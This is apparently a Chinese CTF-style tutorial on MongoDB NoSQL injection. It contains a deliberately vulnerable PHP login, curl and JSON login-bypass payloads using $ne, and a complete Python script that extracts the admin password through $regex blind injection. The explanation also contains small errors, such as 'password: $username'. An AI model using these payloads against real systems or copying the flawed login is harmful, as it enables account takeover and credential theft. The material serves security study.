---
title: NoSQL基础
date: 2026-11-28
---


# NoSQL 基础

## NoSQL 是什么？

NoSQL 是一类非关系型数据库的统称，是除了 sql 之外的数据库，其中 MongoDB 是当前最流行的 NoSQL 数据库之一。

## 什么是 MongoDB？

MongoDB 是一个文档型数据库，数据以类似 JSON 的文档形式存储（JSON-like）。

MongoDB 将数据存储为一个文档，数据结构由键值（key=>value）对组成，字段值可以包含其他文档，数组及文档数组：

一个 users 集合里的文档长这样：

```js
{
  "_id": ObjectId("..."),
  "username": "admin",
  "password": "5f4dcc3b5aa765d61d8327deb882cf99"
}
```

| SQL 世界 | MongoDB 世界 |
| --- | --- |
| database | database |
| table（表） | collection（集合） |
| row（一行记录） | document（文档，类似一个 JSON 对象） |

# MongoDB 的基本语法

## 假设有张表

```js
use demo                          // 切到 demo 库，db 从此指向它
db.myCollection.drop()            // 先清空，防止重复跑时数据叠加
db.myCollection.insertMany([
  { _id: 1, name: "张三", age: 20, city: "北京" },
  { _id: 2, name: "李四", age: 25, city: "上海" },
  { _id: 3, name: "王五", age: 30, city: "北京" },
  { _id: 4, name: "赵六", age: "35", city: "广州" },
  { _id: 5, name: "小明", age: 40, city: "长沙" },
  { _id: 6, name: "孙七", city: "深圳" }
])
```

## 查找所有文档

```js
db.myCollection.find();
```

输出为

```js
[
  { _id: 1, name: "张三", age: 20, city: "北京" },
  { _id: 2, name: "李四", age: 25, city: "上海" },
  { _id: 3, name: "王五", age: 30, city: "北京" },
  { _id: 4, name: "赵六", age: "35", city: "广州" },
  { _id: 5, name: "小明", age: 40, city: "长沙" },
  { _id: 6, name: "孙七", city: "深圳" }
]
```

- `db`：指向当前选中的数据库
- `myCollection`：这个数据库中的表
- `find()`：调用这个表中的查找函数（每个表中都有的函数）

## 按条件查找文档

```js
db.myCollection.find({ age: { $gt: 25 } });
```

输出为

```js
[
  { _id: 3, name: "王五", age: 30, city: "北京" },
  { _id: 5, name: "小明", age: 40, city: "长沙" }
]
```

- `$gt`：大于
- `find({ age: { $gt: 25 } })`：在这个表中查找有 age 的文档（类似 sql 中的行），且筛选出要大于 25 的。

## 同理

- `$ne`：不等于
- `$regex`：正则

```js
{ age: { $ne: 25 } }
```

筛选出不是 25 的

```js
{ age: { $regex: "^25" } }
```

以 25 开头

```js
{ age: { $regex: "25$" } }
```

以 25 结尾

```js
{ age: { $regex: "^25$" } }
```

整体就是 25（近似等于，且只对字符串）

## 比较操作符：

| 操作符 | 描述 | 示例 |
| --- | --- | --- |
| `$eq` | 等于 | `{ age: { $eq: 25 } }` |
| `$ne` | 不等于 | `{ age: { $ne: 25 } }` |
| `$gt` | 大于 | `{ age: { $gt: 25 } }` |
| `$gte` | 大于等于 | `{ age: { $gte: 25 } }` |
| `$lt` | 小于 | `{ age: { $lt: 25 } }` |
| `$lte` | 小于等于 | `{ age: { $lte: 25 } }` |
| `$in` | 在指定的数组中 | `{ age: { $in: [25, 30, 35] } }` |
| `$nin` | 不在指定的数组中 | `{ age: { $nin: [25, 30, 35] } }` |

## 逻辑操作符：

| 操作符 | 描述 | 示例 |
| --- | --- | --- |
| `$and` | 逻辑与，符合所有条件 | `{ $and: [ { age: { $gt: 25 } }, { city: "New York" } ] }` |
| `$or` | 逻辑或，符合任意条件 | `{ $or: [ { age: { $lt: 25 } }, { city: "New York" } ] }` |
| `$not` | 取反，不符合条件 | `{ age: { $not: { $gt: 25 } } }` |
| `$nor` | 逻辑或非，均不符合条件 | `{ $nor: [ { age: { $gt: 25 } }, { city: "New York" } ] }` |

## 常用操作：

- `$ne`：不等于。条件成立范围最大，登录绕过首选。
- `$gt` / `$lt`：大于 / 小于。对字符串按字典序比较。
- `$regex`：正则匹配。配合 `^` 可以逐位确认前缀，盲注核心。
- `$or` / `$and`：逻辑或 / 逻辑与。

## 补充：PHP 侧的查询条件

PHP 的 MongoDB 驱动里，查询条件就是一个 PHP 数组。比如：

```php
$query = ['username' => 'admin', 'password' => ['$ne' => '123456']];
```

这行 PHP 等价于上面的 MongoDB 查询。记住"查询条件就是数组"这一点，后面的注入全靠它。

# 什么是 NoSQL 注入？

NoSQL 注入与 sql 注入的区别是，NoSQL 数据库不使用通用的查询语言，NoSQL 查询语句是使用该程序的编程语言构造的（php,js.python,java 等），且查询是用结构化的对象（BSON/JSON 风格）描述的，因此攻击方式也完全不同：我们不再拼接字符串，而是想办法让查询条件里多出几个操作符，比如 `$ne`（不等于）、`$gt`（大于）、`$regex`（正则匹配）。

## NoSQL 输入分类

- 按语言分类：PHP 数组注入，JavaScript 注入和 Mongo Shell 拼接注入等等
- 按攻击机制分类：重言式注入，联合查询注入，JavaScript 注入、盲注等等

# 注入原理（引用 helloctf 的文章，他说的比较好）

## 从字符串拼接到操作符注入

SQL 注入是往字符串里塞语法，NoSQL 注入则是往 结构 里塞操作符。典型场景是登录：

```php
// 后端期望的查询
['username' => $user, 'password' => $pass]
```

如果 `$user` 和 `$pass` 是攻击者可控的，并且能传入 数组 而不是字符串，查询就会变成：

```php
['username' => ['$ne' => ''], 'password' => ['$ne' => '']]
```

翻译成人话：找一个 username 不等于空、password 也不等于空的用户 —— 数据库里随便哪个用户都满足，于是直接以第一个用户（通常是 admin）的身份登录成功。这就是 NoSQL 注入最经典的 登录绕过。

## PHP 中怎么把参数传成数组

PHP 的 GET/POST 参数有个特性：参数名后面加 `[]` 就能构造数组（详见「PHP 特性与常见绕过」一章）。比如请求：

```http
POST /login.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username[$ne]=&password[$ne]=
```

PHP 解析后：

```php
$_POST['username'] = ['$ne' => ''];
$_POST['password'] = ['$ne' => ''];
```

如果后端代码把这个值原样塞进 MongoDB 查询数组，注入就成立了。

对于 application/json 的接口更直接，JSON 本身就能表达嵌套对象：

```http
POST /api/login HTTP/1.1
Content-Type: application/json

{"username": {"$ne": null}, "password": {"$ne": null}}
```

后端 json_decode 之后直接传给 MongoDB 驱动，效果一样。

注意区分：这和「SQL 注入」里 " or 1=1 -- 的思路不同，MongoDB 查询不是字符串拼接出来的，闭合引号、注释符那一套在这里没用；我们要做的是改变查询条件的 " 类型 " —— 把字符串换成操作符对象。

## 盲注原理

有些场景没有登录绕过可用（比如目标字段是 flag 而不是密码），但查询结果会区分 " 有没有匹配到文档 "（页面显示登录成功 / 失败、用户存在 / 不存在）。这时可以用 `$regex` 逐位爆破：

```js
// flag 以 "f" 开头吗？
{ "flag": { "$regex": "^f" } }
// flag 以 "fl" 开头吗？
{ "flag": { "$regex": "^fl" } }
```

每次请求只问一个 " 是 / 否 " 问题，根据回显判断对错，对就把前缀加长一位再猜下一个字符。思路和「SQL 注入」里的布尔盲注完全一致，只是工具从 `substr()` 换成了 `$regex`。

# PHP + MongoDB 漏洞代码示例

一个典型的有漏洞的登录页面 login.php：

```php
<?php
$manager = new MongoDB\Driver\Manager("mongodb://localhost:27017");

$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';

// 漏洞点：用户输入未经类型检查，直接作为查询条件
$filter = ['username' => $username, 'password' => $password];
$query  = new MongoDB\Driver\Query($filter);

$rows = $manager->executeQuery('ctf.users', $query)->toArray();

if (count($rows) > 0) {
    echo "登录成功，欢迎你：" . htmlspecialchars(json_encode($rows[0]));
} else {
    echo "用户名或密码错误";
}
```

```php
$manager = new MongoDB\Driver\Manager("mongodb://localhost:27017");
```

实例化 Manager 类，然后把 mongodb://localhost:27017 传给构造函数。

```text
mongodb://   localhost   :27017
  协议         主机名      端口

MongoDB \ Driver \ Manager
  厂商           组件      类名
```

```php
$filter=['username' => $username, 'password' => $password];
```

等于：`{ username: $username, password: $username }`

```php
$query  = new MongoDB\Driver\Query($filter);
```

创建一个 Query 对象，把 `$filter` 存进对象内部，再把对象赋给 `$query`。这一步把查询条件包装成 `executeQuery()` 要求的类型。

```php
$rows = $manager->executeQuery('ctf.users', $query)->toArray();
```

相当于查询语句 db.users.find(`{ username: $username, password: $username }`);

```text
ctf    .   users
库名   .  集合名
```

调用 `$manager` 对象中的 `executeQuery()` 方法，用 'ctf.users' 和 `$query` 作为参数，`->toArray()` 输出的结果转为数组，然后把值返回给 `$rows`

`executeQuery()`：从 `$query` 对象里取出你塞进去的 `$filter`，把 `$filter` 编码成 BSON（二进制格式，MongoDB 的内部序列化格式），然后发去 localhost:27017，也就是发给 mongoldb，然后 mongoldb 会返回查询结果

正常用法下传入 username=admin&password=xxx，查询是精确匹配，没问题。问题在于 `$username` / `$password` 没有强制转成字符串，攻击者可以传数组。

## 利用一：登录绕过

```bash
curl -X POST @url:`http://target/login.php` \
  -d 'username[$ne]=xxx&password[$ne]=xxx'
```

查询条件变成 " 用户名不等于 xxx 且密码不等于 xxx "，匹配到库里第一个用户，直接登录成功。

如果知道管理员用户名是 admin，想精确绕过他的密码：

```bash
curl -X POST @url:`http://target/login.php` \
  -d 'username=admin&password[$ne]=xxx'
```

## 利用二：判断字段值（盲注入口）

假设登录成功页面和失败页面内容不同，而我们想知道 password（或某个 flag 字段）的值：

```bash
# 密码以 a 开头吗？—— 登录失败说明不是
curl -X POST @url:`http://target/login.php` \
  -d 'username=admin&password[$regex]=^a'
```

返回 " 登录成功 " 则前缀猜对，继续猜下一位；返回 " 用户名或密码错误 " 则换字符重试。这就是下面要自动化的过程。

# Python 盲注爆破脚本

逐位手测太慢，写个脚本自动化（Python 脚本的一般写法可以参考「Python 脚本」一章的思路，这里直接给完整实现）。目标是爆破 admin 用户的 password 字段，以 " 登录成功 " 字样作为判断依据：

```python
import string
import requests

URL = "@url:`http://target/login.php`"
# 可打印字符集，够用即可；知道是 md5 的话可以换成 "0123456789abcdef"
CHARSET = string.ascii_letters + string.digits + "_{}-"

def check(prefix: str) -> bool:
    """判断 password 是否以 prefix 开头"""
    data = {
        "username": "admin",
        "password[$regex]": "^" + prefix,   # PHP 数组语法传入 $regex 操作符
    }
    resp = requests.post(URL, data=data, timeout=5)
    return "登录成功" in resp.text

def main():
    flag = ""
    while True:
        found = False
        for ch in CHARSET:
            if check(flag + ch):
                flag += ch
                print(f"[+] 当前结果: {flag}")
                found = True
                break
        if not found:
            # 一轮下来没有字符匹配，说明已经爆破到结尾
            break
    print(f"[*] 最终结果: {flag}")

if __name__ == "__main__":
    main()
```

几个要点：

- `password[$regex]` 是 POST 表单的字段名，PHP 解析后得到 `['$regex' => '^...']`，与漏洞代码的查询数组拼在一起就构成了操作符注入。
- 每次只确认一个字符，确认后立即扩展前缀 —— 这就是 " 逐位 " 的含义。
- 一轮循环没有任何字符命中时结束，避免死循环。
- 如果题目是 JSON 接口，把 `requests.post(URL, data=...)` 换成 `json={"username": "admin", "password": {"$regex": "^" + prefix}}` 即可，逻辑不变。

## 文章部分内容来源：

- @url:`https://hello-ctf.com/hc-web/nosql/#nosql`
- @url:`https://www.runoob.com/mongodb/mongodb-query.html`
- @url:`https://xz.aliyun.com/news/9363`
